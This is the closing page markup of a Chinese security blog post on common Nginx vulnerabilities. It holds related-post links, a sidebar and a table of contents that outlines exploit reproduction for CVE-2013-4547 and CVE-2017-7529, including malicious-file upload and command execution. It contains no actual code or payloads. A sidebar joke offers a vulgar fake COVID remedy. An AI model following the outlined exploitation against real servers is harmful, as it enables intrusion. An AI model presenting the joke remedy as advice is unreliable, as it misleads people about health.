+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.takake.com" target="_blank">高木のBlog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>漏洞复现<span class="tagsPageCount">19</span></a><a class="post-meta__box__tags" href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>中间件<span class="tagsPageCount">13</span></a><a class="post-meta__box__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>渗透测试<span class="tagsPageCount">18</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/nginx01.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/posts/20917/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/http_tohttps.png?x-oss-process=style/img-to-webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HTTPS加密流程以及抓包原理解析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/posts/6124/" title="ColdFusion-CVE-2017-3066"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-11</div><div class="title">ColdFusion-CVE-2017-3066</div></div></a></div><div><a href="/posts/62533/" title="Confluence-CVE-2022-26134"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-11</div><div class="title">Confluence-CVE-2022-26134</div></div></a></div><div><a href="/posts/19496/" title="GitLab-CVE-2021-22205"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">GitLab-CVE-2021-22205</div></div></a></div><div><a href="/posts/25650/" title="Spring Cloud-CVE-2022-22947"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-11</div><div class="title">Spring Cloud-CVE-2022-22947</div></div></a></div><div><a href="/posts/8203/" title="Tomcat常见安全漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/apache_tomcat_logo_icon_167851.png?x-oss-process=style/img-to-webp" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-03-25</div><div class="title">Tomcat常见安全漏洞</div></div></a></div><div><a href="/posts/42518/" title="Kibana-CVE-2019-7609"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-11</div><div class="title">Kibana-CVE-2019-7609</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://emotion.acs.pw/emotion/Heo-100/%E6%BB%91%E7%A8%BD.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">网络安全、开发、人工智能</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Takake</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/takakie" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/3494356843497618" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">防疫指南：菊花上插葱，新冠去无踪✌️</div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/645fa415e869402.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%A7%A3%E6%9E%90%E7%B1%BB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">一、解析类漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%BC%93%E5%AD%98%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">二、缓存与信息泄露漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">三、配置错误导致的漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%85%B6%E4%BB%96%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">四、其他安全配置问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2013-4547%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">五.文件名逻辑漏洞（CVE-2013-4547）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">5.1.</span> <span class="toc-text">1. 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">5.2.</span> <span class="toc-text">2. 环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="toc-number">5.3.</span> <span class="toc-text">3. 漏洞复现步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6"><span class="toc-number">5.3.1.</span> <span class="toc-text">步骤1：上传恶意文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9ABurp%E6%8B%A6%E6%88%AA%E4%B8%8E%E4%BF%AE%E6%94%B9%E8%AF%B7%E6%B1%82"><span class="toc-number">5.3.2.</span> <span class="toc-text">步骤2：Burp拦截与修改请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E8%A7%A6%E5%8F%91%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.3.3.</span> <span class="toc-text">步骤3：触发解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8%EF%BC%88%E5%A6%82%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-number">5.4.</span> <span class="toc-text">4. 高级利用（如命令执行）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">5.5.</span> <span class="toc-text">5. 注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">5.6.</span> <span class="toc-text">6. 漏洞修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%80%BB%E7%BB%93"><span class="toc-number">5.7.</span> <span class="toc-text">7. 总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD-%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7529%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">六. 越界读取缓存漏洞（CVE-2017-7529）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-number">6.1.</span> <span class="toc-text">1. 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="toc-number">6.2.</span> <span class="toc-text">2. 环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">6.3.</span> <span class="toc-text">3. 漏洞复现步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E8%8E%B7%E5%8F%96POC%E8%84%9A%E6%9C%AC"><span class="toc-number">6.3.1.</span> <span class="toc-text">步骤1：获取POC脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC"><span class="toc-number">6.3.2.</span> <span class="toc-text">步骤2：执行POC脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.3.3.</span> <span class="toc-text">步骤3：验证漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8%E4%B8%8E%E8%B0%83%E8%AF%95"><span class="toc-number">6.4.</span> <span class="toc-text">4. 高级利用与调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-1"><span class="toc-number">6.5.</span> <span class="toc-text">5. 注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-number">6.6.</span> <span class="toc-text">6. 漏洞修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%80%BB%E7%BB%93-1"><span class="toc-number">6.7.</span> <span class="toc-text">7. 总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/18454/" title="Nginx常见安全漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/nginx01.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx常见安全漏洞"/></a><div class="content"><a class="title" href="/posts/18454/" title="Nginx常见安全漏洞">Nginx常见安全漏洞</a><time datetime="2025-03-26T16:00:00.000Z" title="发表于 2025-03-27 00:00:00">2025-03-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/20917/" title="HTTPS加密流程以及抓包原理解析"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/http_tohttps.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTTPS加密流程以及抓包原理解析"/></a><div class="content"><a class="title" href="/posts/20917/" title="HTTPS加密流程以及抓包原理解析">HTTPS加密流程以及抓包原理解析</a><time datetime="2025-03-25T16:00:00.000Z" title="发表于 2025-03-26 00:00:00">2025-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/8203/" title="Tomcat常见安全漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/apache_tomcat_logo_icon_167851.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat常见安全漏洞"/></a><div class="content"><a class="title" href="/posts/8203/" title="Tomcat常见安全漏洞">Tomcat常见安全漏洞</a><time datetime="2025-03-24T16:00:00.000Z" title="发表于 2025-03-25 00:00:00">2025-03-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/45951/" title="burpsuite笔记"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="burpsuite笔记"/></a><div class="content"><a class="title" href="/posts/45951/" title="burpsuite笔记">burpsuite笔记</a><time datetime="2025-03-23T16:00:00.000Z" title="发表于 2025-03-24 00:00:00">2025-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/37606/" title="基于某电力系统传输加解密操作BP插件编写"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/3477bbcf5d315abda18ef35f71624002.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="基于某电力系统传输加解密操作BP插件编写"/></a><div class="content"><a class="title" href="/posts/37606/" title="基于某电力系统传输加解密操作BP插件编写">基于某电力系统传输加解密操作BP插件编写</a><time datetime="2025-02-05T16:00:00.000Z" title="发表于 2025-02-06 00:00:00">2025-02-06</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/184064234.png" alt="网络安全行业初级从业者！~" title="网络安全行业初级从业者！~"/><div id="runtimeTextTip"></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2022 - 2025 By <a class="footer-bar-link" href="/" title="Takake" target="_blank">Takake</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com" title="GITHUB">GITHUB</a><a class="footer-bar-link" target="_blank" rel="noopener" href="https://chat.opengpt.lol" title="CHATGPT">CHATGPT</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">70</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">125</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">12</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://blog.takake.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https:/api.opengpt.lol/" title="GPT-API"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="GPT-API"/><span class="back-menu-item-text">GPT-API</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 站点动态</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>4</sup></a><a href="/tags/Chrome/" style="font-size: 0.88rem;">Chrome<sup>2</sup></a><a href="/tags/IPV6/" style="font-size: 0.88rem;">IPV6<sup>1</sup></a><a href="/tags/JAVA/" style="font-size: 0.88rem;">JAVA<sup>2</sup></a><a href="/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">JAVA反序列化<sup>4</sup></a><a href="/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" style="font-size: 0.88rem;">JAVA反序列化漏洞<sup>4</sup></a><a href="/tags/JAVA%E9%AB%98%E7%BA%A7/" style="font-size: 0.88rem;">JAVA高级<sup>1</sup></a><a href="/tags/JS%E9%80%86%E5%90%91/" style="font-size: 0.88rem;">JS逆向<sup>2</sup></a><a href="/tags/NAS/" style="font-size: 0.88rem;">NAS<sup>3</sup></a><a href="/tags/PHP/" style="font-size: 0.88rem;">PHP<sup>1</sup></a><a href="/tags/RCE/" style="font-size: 0.88rem;">RCE<sup>16</sup></a><a href="/tags/TLS/" style="font-size: 0.88rem;">TLS<sup>1</sup></a><a href="/tags/base64/" style="font-size: 0.88rem;">base64<sup>1</sup></a><a href="/tags/cisp/" style="font-size: 0.88rem;">cisp<sup>2</sup></a><a href="/tags/draft/" style="font-size: 0.88rem;">draft<sup>4</sup></a><a href="/tags/esxi/" style="font-size: 0.88rem;">esxi<sup>1</sup></a><a href="/tags/hexo/" style="font-size: 0.88rem;">hexo<sup>1</sup></a><a href="/tags/html/" style="font-size: 0.88rem;">html<sup>1</sup></a><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>1</sup></a><a href="/tags/javascript/" style="font-size: 0.88rem;">javascript<sup>1</sup></a><a href="/tags/nas/" style="font-size: 0.88rem;">nas<sup>1</sup></a><a href="/tags/utf-8/" style="font-size: 0.88rem;">utf-8<sup>1</sup></a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 0.88rem;">中间件<sup>13</sup></a><a href="/tags/%E4%BA%91%E5%AD%98%E5%82%A8/" style="font-size: 0.88rem;">云存储<sup>1</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>10</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 0.88rem;">博客<sup>1</sup></a><a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 0.88rem;">实验<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 0.88rem;">密码<sup>8</sup></a><a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 0.88rem;">开发<sup>4</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">渗透测试<sup>18</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 0.88rem;">漏洞复现<sup>19</sup></a><a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 0.88rem;">硬盘<sup>1</sup></a><a href="/tags/%E7%A7%81%E6%9C%89%E4%BA%91/" style="font-size: 0.88rem;">私有云<sup>1</sup></a><a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 0.88rem;">编码<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 0.88rem;">网络协议<sup>2</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">网络安全<sup>7</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" style="font-size: 0.88rem;">网络配置<sup>1</sup></a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 0.88rem;">证书<sup>1</sup></a><a href="/tags/%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" style="font-size: 0.88rem;">限制绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">靶场<sup>3</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" 